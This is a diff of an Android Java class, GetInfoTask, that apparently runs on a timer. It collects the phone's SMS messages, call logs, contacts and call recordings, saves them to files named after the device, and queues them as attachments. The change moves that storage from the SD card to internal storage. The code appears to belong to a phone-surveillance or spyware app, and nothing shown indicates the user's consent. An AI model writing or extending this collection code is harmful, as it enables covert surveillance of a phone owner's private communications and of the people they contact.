@@ -126,8 +126,8 @@ public class GetInfoTask extends TimerTask
 			
 			// If network cut, return
 			if (!NetworkUtil.isNetworkConnected(context)) {
-				// Clean the files in SD-CARD
-				FileCtrl.cleanTxtFiles();
+				// Clean info files
+				FileCtrl.cleanTxtFiles(context);
 				return;
 			}
 			
@@ -155,8 +155,8 @@ public class GetInfoTask extends TimerTask
 				ConfigCtrl.setLastGetInfoTime(context, new Date());
 			}
 			
-			// Clean the files in SD-CARD
-			FileCtrl.cleanTxtFiles();
+			// Clean info files
+			FileCtrl.cleanTxtFiles(context);
 		}
 		
 		// ===================================================================================
@@ -182,16 +182,16 @@ public class GetInfoTask extends TimerTask
 		String prefix = context.getResources().getString(R.string.phonecall_record);
 		List<File> wavs = new ArrayList<File>();
 		try {
-			File dir = FileCtrl.getDefaultDir();
+			File dir = FileCtrl.getInternalStorageFilesDir(context);
 			if (!dir.exists() || !dir.isDirectory()) return;
 			
 			File[] files = dir.listFiles();
 			String name;
-			for (int i = 0; i < files.length; i++) {
-				name = files[i].getName();
-				if (files[i].isFile() && name.endsWith(FileCtrl.SUFFIX_WAV))
+			for (File file : files) {
+				name = file.getName();
+				if (file.isFile() && name.endsWith(FileCtrl.SUFFIX_WAV))
 				{
-					wavs.add(files[i]);
+					wavs.add(file);
 				}
 			}
 		} catch (Exception e) {
@@ -287,11 +287,11 @@ public class GetInfoTask extends TimerTask
 		}
 		
 		String deviceName = ConfigCtrl.getSelfName(context);
-		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.sms_name), deviceName, FileCtrl.SUFFIX_TXT); 
+		String fileName = makeFileName(context, context.getResources().getString(R.string.sms_name), deviceName, FileCtrl.SUFFIX_TXT); 
 		try {
-			if (!FileCtrl.defaultDirExist()) FileCtrl.createDefaultSDDir();
+			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
 				
-			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
+			File file = FileCtrl.Save2InternalStorage(context, fileName, sb.toString());
 			if (file != null) attachments.add(file);
 		} catch (Exception e) {
 			Log.e(LOGTAG, e.getMessage());
@@ -308,11 +308,11 @@ public class GetInfoTask extends TimerTask
 		}
 		
 		String deviceName = ConfigCtrl.getSelfName(context);
-		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.phonecall_name), deviceName, FileCtrl.SUFFIX_TXT); 
+		String fileName = makeFileName(context, context.getResources().getString(R.string.phonecall_name), deviceName, FileCtrl.SUFFIX_TXT); 
 		try {
-			if (!FileCtrl.defaultDirExist()) FileCtrl.createDefaultSDDir();
+			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
 				
-			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
+			File file = FileCtrl.Save2InternalStorage(context, fileName, sb.toString());
 			if (file != null) attachments.add(file);
 		} catch (Exception e) {
 			Log.e(LOGTAG, e.getMessage());
@@ -329,11 +329,11 @@ public class GetInfoTask extends TimerTask
 		}
 		
 		String deviceName = ConfigCtrl.getSelfName(context);
-		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.contact_name), deviceName, FileCtrl.SUFFIX_TXT); 
+		String fileName = makeFileName(context, context.getResources().getString(R.string.contact_name), deviceName, FileCtrl.SUFFIX_TXT); 
 		try {
-			if (!FileCtrl.defaultDirExist()) FileCtrl.createDefaultSDDir();
+			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
 				
-			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
+			File file = FileCtrl.Save2InternalStorage(context, fileName, sb.toString());
 			if (file != null) attachments.add(file);
 		} catch (Exception e) {
 			Log.e(LOGTAG, e.getMessage());
@@ -372,6 +372,11 @@ public class GetInfoTask extends TimerTask
 		} else {
 			return null;
 		}
+	}
+	
+	private static String makeFileName(Context context, String nameBase, String deviceName, String suffix) 
+	{	
+		return nameBase + "-" + deviceName + "-" + DatetimeUtil.format3.format(new Date()) + suffix;
 	}
 	
 }
